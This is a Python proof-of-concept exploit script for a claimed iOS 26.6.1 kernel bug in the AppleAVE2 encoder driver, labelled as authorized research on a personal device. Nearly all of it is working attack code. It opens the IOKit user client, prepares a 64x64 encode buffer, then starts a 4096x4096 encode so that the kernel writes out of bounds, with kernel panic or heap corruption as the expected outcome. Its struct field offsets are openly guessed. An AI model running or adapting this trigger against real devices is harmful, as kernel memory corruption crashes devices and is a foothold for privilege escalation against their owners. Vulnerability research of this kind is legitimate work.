#!/usr/bin/env python3
"""
CVE-2026-112689 — AppleAVE2 TOCTOU OOB Write PoC
Target: iOS 26.6.1 (vulnerable) | Fixed: iOS 26.7.2

Mechanism:
  Config[client+0x2ec0] defaults to 0 (≠ 1) → mismatch-check bypass is ALWAYS ACTIVE.
  Call IO_Prepare with small dims → kalloc allocates small encode buffer.
  Call IO_Start with large dims → bypass fires → kext writes large frame into small buffer.

IOKit dispatch (AppleAVE2UserClient):
  Sel 0  IO_Open    – open encode session
  Sel 1  IO_Close
  Sel 2  IO_Config  – sets Config[+0x2ec0]; NOT NEEDED (defaults to 0 = bypass active)
  Sel 3  IO_Prepare – allocates buffer; must be called with small dims
  Sel 4  IO_Start   – vulnerable; bypass at VA 0x851df84; must be called with large dims
  ...

Struct sizes (from kext handler size checks):
  S_AVE_UCInParam_Prepare : 0x1a0a0 = 106656 bytes
  S_AVE_UCInParam_Start   : 0x1a0b0 = 106672 bytes
  S_AVE_UCOutParam_Start  : at least 0x150  = 336 bytes

Field layout (inferred from first-24-bytes load pattern at 0x8644c80):
  The first 24 bytes of S_AVE_UCInParam_Prepare/Start are passed directly to
  the underlying allocator. Likely layout:
    +0x00  uint32  ui32Width    (or packed with height)
    +0x04  uint32  ui32Height
    +0x08  uint32  ui32PixelFmt
    +0x0C  uint32  ui32Codec    (e.g. H.264 = 0x61766331 'avc1')
    +0x10  uint64  flags/reserved

  FIELD_WIDTH_OFF and FIELD_HEIGHT_OFF below — adjust if first run fails validation.
  Common alternates: 0x28, 0x30, 0x40, 0x48 (after a common header with timeout fields).

Run via ResearchHost offload_python or directly on-device.
Research: authorized testing on personal device (iPhone17,4 / 26.6.1).
"""

import ctypes, struct, sys, os, time

# ── Constants ────────────────────────────────────────────────────────────────

PREPARE_IN_SIZE  = 106656   # sizeof(S_AVE_UCInParam_Prepare)
PREPARE_OUT_SIZE = 0x200    # generous output buffer
START_IN_SIZE    = 106672   # sizeof(S_AVE_UCInParam_Start)
START_OUT_SIZE   = 0x200

# Field offsets in the input struct (adjust if validation fails)
FIELD_WIDTH_OFF  = 0x00     # uint32 width
FIELD_HEIGHT_OFF = 0x04     # uint32 height
FIELD_PIXFMT_OFF = 0x08     # uint32 pixel format
FIELD_CODEC_OFF  = 0x0C     # uint32 codec type

# H.264 FourCC
CODEC_AVC1 = 0x61766331     # 'avc1'

# Trigger dimensions
PREPARE_W = 64
PREPARE_H = 64
START_W   = 4096
START_H   = 4096

# ── IOKit bindings ───────────────────────────────────────────────────────────

try:
    libSystem = ctypes.CDLL("/usr/lib/libSystem.B.dylib")
    IOKit = ctypes.CDLL("/System/Library/Frameworks/IOKit.framework/IOKit")
    CF = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
except OSError as e:
    print(f"[-] Failed to load libraries: {e}")
    sys.exit(1)

mach_port_t  = ctypes.c_uint32
io_service_t = ctypes.c_uint32
io_connect_t = ctypes.c_uint32
kern_return_t = ctypes.c_int
c_uint32_p   = ctypes.POINTER(ctypes.c_uint32)

KERN_SUCCESS = 0

IOServiceGetMatchingService = IOKit.IOServiceGetMatchingService
IOServiceGetMatchingService.restype = io_service_t
IOServiceGetMatchingService.argtypes = [mach_port_t, ctypes.c_void_p]

IOServiceMatching = IOKit.IOServiceMatching
IOServiceMatching.restype  = ctypes.c_void_p
IOServiceMatching.argtypes = [ctypes.c_char_p]

IOServiceOpen = IOKit.IOServiceOpen
IOServiceOpen.restype  = kern_return_t
IOServiceOpen.argtypes = [io_service_t, mach_port_t, ctypes.c_uint32,
                           ctypes.POINTER(io_connect_t)]

IOServiceClose = IOKit.IOServiceClose
IOServiceClose.restype  = kern_return_t
IOServiceClose.argtypes = [io_connect_t]

IOObjectRelease = IOKit.IOObjectRelease
IOObjectRelease.restype  = kern_return_t
IOObjectRelease.argtypes = [io_service_t]

IOConnectCallStructMethod = IOKit.IOConnectCallStructMethod
IOConnectCallStructMethod.restype  = kern_return_t
IOConnectCallStructMethod.argtypes = [
    io_connect_t,
    ctypes.c_uint32,
    ctypes.c_void_p,
    ctypes.c_size_t,
    ctypes.c_void_p,
    ctypes.POINTER(ctypes.c_size_t),
]

mach_task_self = libSystem.mach_task_self
mach_task_self.restype  = mach_port_t
mach_task_self.argtypes = []

kIOMainPortDefault = ctypes.c_uint32(0)


def kr_str(kr):
    return "KERN_SUCCESS" if kr == KERN_SUCCESS else f"0x{kr & 0xffffffff:08x}"


def make_in_struct(size, width, height, codec=CODEC_AVC1):
    buf = bytearray(size)
    struct.pack_into('<I', buf, FIELD_WIDTH_OFF,  width)
    struct.pack_into('<I', buf, FIELD_HEIGHT_OFF, height)
    struct.pack_into('<I', buf, FIELD_CODEC_OFF,  codec)
    return buf


def run_poc():
    print("CVE-2026-112689 PoC — AppleAVE2 TOCTOU OOB write")
    print(f"Target: iOS 26.6.1 | Fixed: iOS 26.7.2")
    print()

    matching = IOServiceMatching(b"AppleAVE2Driver")
    if not matching:
        print("[-] IOServiceMatching returned NULL")
        sys.exit(1)

    service = IOServiceGetMatchingService(kIOMainPortDefault, matching)
    if service == 0:
        print("[-] IOServiceGetMatchingService failed — service not found")
        print("    Is this running on a device? Does ResearchHost have AVE2 entitlements?")
        print("    Entitlement needed: com.apple.private.coremedia.allow-avencoder-xpc (or similar)")
        sys.exit(1)

    print(f"[+] Found AppleAVE2Driver service: 0x{service:08x}")

    connect = io_connect_t(0)
    task    = mach_task_self()
    kr = IOServiceOpen(service, task, 0, ctypes.byref(connect))
    IOObjectRelease(service)

    if kr != KERN_SUCCESS:
        print(f"[-] IOServiceOpen failed: {kr_str(kr)}")
        print("    Missing entitlement or connection type mismatch")
        sys.exit(1)

    print(f"[+] Opened connection: 0x{connect.value:08x}")

    # 1. IO_Open (sel 0) — open encode session
    open_in  = bytearray(0x200)
    open_out = bytearray(0x200)
    out_sz   = ctypes.c_size_t(len(open_out))
    kr = IOConnectCallStructMethod(
        connect.value, 0,
        (ctypes.c_uint8 * len(open_in)).from_buffer(open_in), len(open_in),
        (ctypes.c_uint8 * len(open_out)).from_buffer(open_out), ctypes.byref(out_sz)
    )
    print(f"[+] IO_Open (sel 0): {kr_str(kr)}")
    if kr != KERN_SUCCESS:
        print("    IO_Open failed — may need larger struct or different struct format")

    # 2. IO_Prepare (sel 3) — SMALL dimensions → allocates small encode buffer
    print(f"\n[*] IO_Prepare with {PREPARE_W}x{PREPARE_H} (small buffer)")
    prep_in  = make_in_struct(PREPARE_IN_SIZE, PREPARE_W, PREPARE_H)
    prep_out = bytearray(PREPARE_OUT_SIZE)
    out_sz   = ctypes.c_size_t(PREPARE_OUT_SIZE)

    prep_in_arr  = (ctypes.c_uint8 * PREPARE_IN_SIZE).from_buffer(prep_in)
    prep_out_arr = (ctypes.c_uint8 * PREPARE_OUT_SIZE).from_buffer(prep_out)

    kr = IOConnectCallStructMethod(
        connect.value, 3,
        prep_in_arr, PREPARE_IN_SIZE,
        prep_out_arr, ctypes.byref(out_sz)
    )
    print(f"[+] IO_Prepare result: {kr_str(kr)}")

    if kr != KERN_SUCCESS:
        print("    IO_Prepare failed — struct layout may be wrong.")
        print("    Try FIELD_WIDTH_OFF = 0x28 or 0x40 (after common header).")
        print(f"    output[0:32]: {bytes(prep_out[:32]).hex()}")
        IOServiceClose(connect.value)
        sys.exit(1)

    print(f"    Small buffer allocated for {PREPARE_W}x{PREPARE_H} frame")
    time.sleep(0.01)

    # 3. IO_Start (sel 4) — LARGE dimensions with bypass ACTIVE
    #    Config[+0x2ec0] defaults to 0 ≠ 1 → tbnz bypass fires at VA 0x851df84
    #    → dimension mismatch check SKIPPED
    #    → kext tries to encode 4096×4096 pixels into 64×64 buffer → OOB WRITE
    print(f"\n[*] IO_Start with {START_W}x{START_H} (triggers OOB write)")
    print( "    Bypass at VA 0xfffffff00851df84 fires because Config[+0x2ec0] = 0 ≠ 1")
    print( "    Expected: kernel panic or memory corruption")

    start_in  = make_in_struct(START_IN_SIZE, START_W, START_H)
    start_out = bytearray(START_OUT_SIZE)
    out_sz    = ctypes.c_size_t(START_OUT_SIZE)

    start_in_arr  = (ctypes.c_uint8 * START_IN_SIZE).from_buffer(start_in)
    start_out_arr = (ctypes.c_uint8 * START_OUT_SIZE).from_buffer(start_out)

    kr = IOConnectCallStructMethod(
        connect.value, 4,
        start_in_arr, START_IN_SIZE,
        start_out_arr, ctypes.byref(out_sz)
    )
    print(f"\n[+] IO_Start result: {kr_str(kr)}")

    if kr == KERN_SUCCESS:
        print("    !! Returned SUCCESS — OOB write likely occurred !!")
        print("    Check kernel logs / crash reporter for signs of heap corruption")
    else:
        print(f"    Returned error: {kr_str(kr)}")
        print("    May be validation failure (adjust dimensions or field offsets)")

    IOServiceClose(connect.value)
    print("\n[+] Done. Connection closed.")


if __name__ == "__main__":
    run_poc()
